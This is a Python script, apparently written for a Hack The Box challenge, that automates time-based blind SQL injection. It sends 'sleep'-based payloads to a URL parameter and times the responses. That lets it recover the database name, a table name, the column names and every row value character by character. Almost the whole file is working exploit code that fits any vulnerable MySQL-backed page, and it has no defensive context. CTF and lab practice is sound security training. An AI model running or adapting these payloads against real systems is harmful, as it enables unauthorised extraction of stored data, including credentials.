#!/usr/bin/python3

# Note that there might be false positive because of real timeout (no by our sleep).
# Increasing the timeout and sleep might mitigate the issue.

# If `1' and sleep(5)` doesn't work, try without single quote.

import requests
import sys
import string

DEFAULT_TIMEOUT = 2
MAX_NAME_LEN = 50
CHARS = [c for c in string.printable if c != '%']

def clear_line():
    sys.stdout.write("\033[F")  #back to previous line
    sys.stdout.write("\033[K")  #clear line

# url should be like 'http://xxx/yyy.php?id={}'
def ask_get(url):  # return True if successfuly sleeped
    rst = False
    try:
        r = requests.get(url, timeout=DEFAULT_TIMEOUT)
        if not r.ok:
            raise Exception('[!] Response is not ok')
    except requests.exceptions.Timeout:
        rst = True
    return rst


# checks the vulnerability. Exits the program if not vuln.
def check_vuln(url):
    if ask_get(url.format("1 and sleep(5)")):
        print('[+] Target appears to be vulnerable')
    else:
        print('[!] Not vulnerable')
        sys.exit(-1)

# get the length of the database name.
def get_len_db_name(url):
    # the 'dual' table name is useless here.
    print('[+] Checking database name length')
    len_db_name = 1
    payload = "1 and (select sleep(4) from dual \
                where (select length(database())={}))-- +"
    print("[+] Tring length ", len_db_name)
    while True:
        if ask_get(url.format(payload)):
            break
        len_db_name += 1
        clear_line()
        print("[+] Tring length ", len_db_name)
        if len_db_name == MAX_NAME_LEN + 1:
            print("[+] Already tried configured max length, abort.")
            len_db_name = -1
            break

    if len_db_name > 0:
        print('[+] Database name has {} chars'.format(len_db_name))
    return len_db_name

# brute force the database name
def get_db_name(url):
    len_db_name = get_len_db_name(url)
    db_name = ''
    payload_tmpl = "1 and \
            (select sleep(4) from dual where \
            (select ascii(substr(database(),{},1))={})\
            )-- +"
    if len_db_name > 0:
        print('[+] brute-force database name')
        print('[+] Database name is {}'.format(db_name))
        for i in range(1, len_db_name + 1):
            for c in CHARS:
                if ask_get(url.format(payload_tmpl.format(i, ord(c)))):
                    db_name += c
                    clear_line()
                    print('[+] Database name is {}'.format(db_name))
                    break
    else:
        print('[+] brute-force database name without length info')
        print('[+] Database name is {}'.format(db_name))
        for i in range(1, MAX_NAME_LEN + 1):
            found = False
            for c in CHARS:
                if ask_get(url.format(payload_tmpl.format(i, ord(c)))):
                    found = True
                    db_name += c
                    clear_line()
                    print('[+] Database name is {}'.format(db_name))
                    break
            if not found:   # end of the db name
                break
    return db_name

# brute force the length of table name
def get_len_tb_name(url, offset):
    len_tb_name = 1
    print('[+] Checking table name length')
    print("[+] Tring length ", len_tb_name)
    payload_tmpl = "1 and \
            (select sleep(4) from dual where \
                (select length(\
                    (select table_name from information_schema.tables where table_schema=database() limit {}, 1)\
                    ) = {}\
                )\
            )-- +"
    while True:
        if ask_get(url.format(payload_tmpl.format(offset, len_tb_name))):
            break
        clear_line()
        len_tb_name += 1
        print("[+] Tring length ", len_tb_name)
        if len_tb_name == MAX_NAME_LEN + 1:
            print("[+] Already tried configured max length, abort.")
            len_tb_name = -1
            break
            
    print('[+] Table name has {} chars'.format(len_tb_name))
    return len_tb_name

# brute force the table name
# TODO: could be more than one table. Need a N param.
def get_tb_name(url, offset):
    len_tb_name = get_len_tb_name(url, offset)
    payload_tmpl = "1 and \
            (select sleep(4) from dual where \
                (select \
                    ascii(\
                        substr(\
                            (select table_name from information_schema.tables where table_schema=database() limit {}, 1)\
                            , {}, 1\
                        )\
                    ) = {}\
                )\
            )-- +"
    tb_name = ''
    if len_tb_name > 0:
        print('[+] brute-force table name')
        print('[+] Table name is')
        for i in range(1, len_tb_name + 1):
            for c in CHARS:
                if ask_get(url.format(payload_tmpl.format(offset, i, ord(c)))):
                    clear_line()
                    tb_name += c
                    print('[+] Table name is {}'.format(tb_name))
                    break
    else:
        print('[+] brute-force table name without length info.')
        print('[+] Table name is')
        for i in range(1, MAX_NAME_LEN + 1):
            for c in CHARS:
                if ask_get(url.format(payload_tmpl.format(i, ord(c)))):
                    clear_line()
                    tb_name += c
                    print('[+] Table name is {}'.format(tb_name))
                    break

    return tb_name

# gets number of columns
def get_num_col(url, tb_name):
    payload_tmpl = "1 and \
            (select sleep(4) from dual where \
                (select \
                    (select COUNT(column_name) from information_schema.columns where table_name='{}'" + \
                    ")\
                    = {}\
                )\
            )-- +"
    num_cols = 1
    while True:
        if ask_get(url.format(payload_tmpl.format(tb_name, num_cols))):
            break
        num_cols += 1
    print('[+] There are {} columns in table {}'.format(num_cols, tb_name))
    return num_cols

# gets length of the Nth column name.
# N starts from 0;
def get_len_col_name(url, tb_name, n):
    len_col_name = 1
    print('[+] Checking column name length')
    payload_tmpl = "1 and \
            (select sleep(4) from dual where \
                (select length(\
                    (select column_name from information_schema.columns where table_name='{}' limit {}, 1)\
                    ) = {}\
                )\
            )-- +"
    while True:
        payload = payload_tmpl.format(tb_name, n, len_col_name)
        if ask_get(url.format(payload)):
            break
        len_col_name += 1
    print('[+] Column name has {} chars'.format(len_col_name))
    return len_col_name

# brutes force the Nth column name.
# N starts from 0;
def get_col_name(url, tb_name, n, len_col_name):
    print('[+] brute-force column name')
    payload_tmpl = "1 and \
            (select sleep(4) from dual where \
                (select \
                    ascii(\
                        substr(\
                            (select column_name from information_schema.columns where table_name='{}' limit {}, 1)\
                            , {}, 1\
                        )\
                    ) = {}\
                )\
            )-- +"
    print('[+] Column name is')
    col_name = ''
    for i in range(1, len_col_name + 1):
        for c in CHARS:
            payload = payload_tmpl.format(tb_name, n, i, ord(c))
            if ask_get(url.format(payload)):
                clear_line()
                col_name += c
                print('[+] Column name is {}'.format(col_name))
                break
    return col_name

# Counts how many rows are there in the table.
def count_rows(url, tb_name):
    print('[+] Count number of rows in the table ' + tb_name)
    payload_tmpl = "1 and \
            (select sleep(4) from dual where (select count(*) from {}) = {})-- +"
    num_rows = 1
    while True:
        payload = payload_tmpl.format(tb_name, num_rows)
        if ask_get(url.format(payload)):
            break
        num_rows += 1
    print('[+] There are {} rows in {}'.format(num_rows, tb_name))
    return num_rows

# brutes force the column value of Nth row.
def get_col_val(url, tb_name, n, col_name):
    print('[+] Checking length, column {}, row {}, table {}'.format(col_name, n, tb_name))
    payload_tmpl = "1 and \
            (select sleep(4) from dual where \
                (select length(\
                            (select {} from {} limit {}, 1)\
                        ) = {}\
                )\
            )-- +"
    # Note that the value could be null!
    len_col_val = 0
    while True:
        payload = payload_tmpl.format(col_name, tb_name, n, len_col_val)
        if ask_get(url.format(payload)):
            break
        len_col_val += 1
    print('[+] It has {} chars'.format(len_col_val))

    print('[+] Brute-force value length, column {}, row {}'.format(col_name, n))
    payload_tmpl = "1 and \
            (select sleep(4) from dual where \
                (select \
                    ascii(substr((select {} from {} limit {}, 1) , {}, 1)) = {}\
                )\
            )-- +"
    print('[+] Value is ')
    value = ''
    for i in range(1, len_col_val + 1):
        for c in CHARS:
            payload = payload_tmpl.format(col_name, tb_name, n, i, ord(c))
            if ask_get(url.format(payload)):
                clear_line()
                value += c
                print('[+] Value is {}'.format(value))
                break
    return value

def main():
    url = 'http://docker.hackthebox.eu:32094/portfolio.php?id={}'
    check_vuln(url)
    # db_name = get_db_name(url)
    tb_name = get_tb_name(url, 1)
    num_col = get_num_col(url, tb_name)
    col_names = []
    for i in range(num_col):
        len_col_name = get_len_col_name(url, tb_name, i)
        col_names.append(get_col_name(url, tb_name, i, len_col_name))
    print("[+] Columns are: ", col_names)
    num_rows = count_rows(url, tb_name)
    for i in range(num_rows):
        values = []
        for col_name in col_names:
            values.append(get_col_val(url, tb_name, i, col_name))
        print("Values are: ", values)

if __name__ == '__main__':
    main()
